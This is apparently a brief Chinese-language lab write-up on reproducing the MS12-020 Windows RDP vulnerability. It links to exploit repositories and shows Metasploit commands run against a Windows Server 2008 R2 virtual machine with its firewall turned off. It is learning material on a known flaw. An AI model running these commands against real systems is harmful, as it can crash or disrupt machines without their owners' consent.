>https://github.com/xiaoxiaoleo/windows-kernel-exploits/blob/2892a653297ccbbab8b2690cf7c9e302d7ffe03f/MS12-020
>https://max.book118.com/html/2016/0314/37644373.shtm
>https://github.com/JYanger/MS12-020-Check/blob/master/ms12-020_one.py
>https://blog.csdn.net/qq_73252299/article/details/133156450

下载的Windows XP Home Service Pack 2 版本， Windows XP家庭版，没有远程桌面的功能。profession版本有 </n>
</br>我的电脑->属性->远程
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/2d657a821a4b48b1b1b94c0b098f7b48.png)
</br>没有远程桌面选项

下载Windows server 2008 R2
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/8e89e3ad2f3248a5bea3ac3817b3cf7a.png)
顺手把防火墙关了

```
msfconsole
search ms12-020  ##搜索MS12-020漏洞编号
use 0 
show options  
set rhosts 192.158.18.143 
run 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/f60d7b6f0ecd4581880dc778e6a411d6.png)